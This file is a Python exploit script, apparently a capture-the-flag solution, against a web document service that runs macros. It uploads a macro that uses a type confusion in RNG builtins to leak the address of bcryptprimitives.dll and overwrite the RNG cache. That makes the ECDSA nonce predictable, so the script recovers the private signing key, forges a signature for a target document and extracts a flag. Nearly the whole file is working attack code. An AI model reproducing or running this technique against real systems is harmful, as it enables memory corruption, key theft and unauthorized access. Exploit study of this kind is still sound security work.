#!/usr/bin/env python3

import random
import re
import requests
import string
import sys

from ecdsa import SigningKey
from ecdsa.curves import NIST256p
from ecdsa.numbertheory import inverse_mod
from hashlib import sha256


# Offset of ProcessPrng in bcryptprimitives.dll
PROCESSPRNG_OFF = 0x9340
# Offset of g_TrustedEnvironment in bcryptprimitives.dll
G_TRUSTEDENVIRONMENT_OFF = 0x76900
# Offset of g_rootAesRngState in bcryptprimitives.dll
G_ROOTAESRNGSTATE_OFF = 0x767c0


FLAG_REGEX = re.compile(r'[0-9A-Za-z]{31}=')


def rand_alnum(length: int) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def recover_privkey(data: bytes, r: int, s: int, k: int) -> tuple[int, SigningKey]:
    z = int.from_bytes(sha256(data).digest(), 'big')
    d = (s * k - z) * inverse_mod(r, NIST256p.order) % NIST256p.order
    sk = SigningKey.from_secret_exponent(d, curve=NIST256p, hashfunc=sha256)
    return d, sk


def exploit(host: str, doc_id: str):
    sess = requests.Session()

    username = rand_alnum(16)
    password = rand_alnum(16)
    r = sess.post(f'http://{host}/register', data={
        'username': username,
        'password': password,
    })

    # Get document ID for a dummy document.
    filename = rand_alnum(20) + '.mdx'
    r = sess.post(f'http://{host}/write', data={
        'filename': filename,
        'body': '',
        'macro': '',
    })
    r = sess.get(f'http://{host}/api/share/{filename}')
    dummy_doc_id = r.json()['link'].split('/')[-1].split('?')[0]

    # Exploit type confusion in RNG builtins to perform a signature with known k.
    macro = f"""
Function WriteFastRand(addr As Integer, first_byte As Integer, ByRef arr() As Integer) As Integer
    'Two-argument overload is vulnerable to type confusion on first argument
    'Fake a String in an IntegerArray
    arr(0) = addr
    'Perform write
    'Entropy is all zeroes so it has no effect
    RandSeed(first_byte - 1)
    FastRand(arr, Chr(0))
    WriteFastRand = 0
End Function

Function Main(text As String) As String
    'Leak address of ProcessPrng in bcryptprimitives.dll
    Dim leak As Integer
    Dim leak_str As String
    leak_str = Describe(CryptoRand)
    leak_str = Mid(leak_str, 27, Len(leak_str)-27)
    leak = CInt(leak_str)

    'ProcessPrng @ bcryptprimitives.dll+PROCESSPRNG_OFF
    Dim dll_base As Integer
    dll_base = leak - {PROCESSPRNG_OFF}

    'Set g_TrustedEnvironment & 8 so that root RNG will be used
    'g_TrustedEnvironment @ bcryptprimitives.dll+G_TRUSTEDENVIRONMENT_OFF
    'Corrupting memory after g_TrustedEnvironment is ok
    Dim arr0(128) As Integer
    WriteFastRand(dll_base + {G_TRUSTEDENVIRONMENT_OFF}, 8, arr0)

    'Use SignToken to call ProcessPrng for k to set a big enough available bytes in the cache
    'We can't use CryptoRand because length < 128 (for cache) is forbidden
    'Let N be the size of the curve (256 bits = 32 bytes)
    'SymCryptEcDsaSignEx performs 3 N-sized calls to ProcessPrng:
    '   1. To generate k
    '   2, 3. To calculate modular inverses
    'With an initially empty cache, one call therefore leaves 32 available bytes
    'This is sufficient to control k for the next signing operation
    SignToken("{dummy_doc_id}")

    'Overwrite bcryptprimitives.dll RNG cache state
    'Root AES RNG state @ bcryptprimitives.dll+G_ROOTAESRNGSTATE_OFF
    'AES RNG state:
    '   Random cache (128 bytes) @ +0xb0
    'Overwrite cache with predictable data
    Dim arr1(128) As Integer
    WriteFastRand(dll_base + {G_ROOTAESRNGSTATE_OFF+0xb0}, 255, arr1)

    'Now the crypto RNG output is predictable
    'Leak a signature with predictable k
    'RNG output = ff 00 01 02 ... 1e
    'Little-endian, +1 offset in SymCryptFdefModSeetRandomGeneric
    'k = 0x1e1d1c1b...040302010100
    Main = SignToken("{dummy_doc_id}")
End Function
"""
    exploit_filename = rand_alnum(20) + '.mdx'
    r = sess.post(f'http://{host}/write', data={
        'filename': exploit_filename,
        'body': '',
        'macro': macro,
    })
    r = sess.post(f'http://{host}/api/run', json={
        'filename': exploit_filename,
    })
    sig_hex = r.text.strip()

    # Recover private signing key from signature.
    sig = bytes.fromhex(sig_hex)
    r = int.from_bytes(sig[:32], byteorder='big')
    s = int.from_bytes(sig[32:], byteorder='big')
    k = 0x1e1d1c1b1a191817161514131211100f0e0d0c0b0a0908070605040302010100
    _, sk = recover_privkey(dummy_doc_id.encode(), r,  s, k)

    # Sign target document ID.
    target_sig = sk.sign(doc_id.encode()).hex()

    r = sess.get(f'http://{host}/shared/{doc_id}?sign={target_sig}')
    m = FLAG_REGEX.search(r.text)
    return m.group() if m is not None else 'Attack failed :('


def main():
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} <host> <document ID>', file=sys.stderr)
        exit(1)

    host, doc_id = sys.argv[1:]
    print(exploit(host, doc_id))


if __name__ == '__main__':
    main()
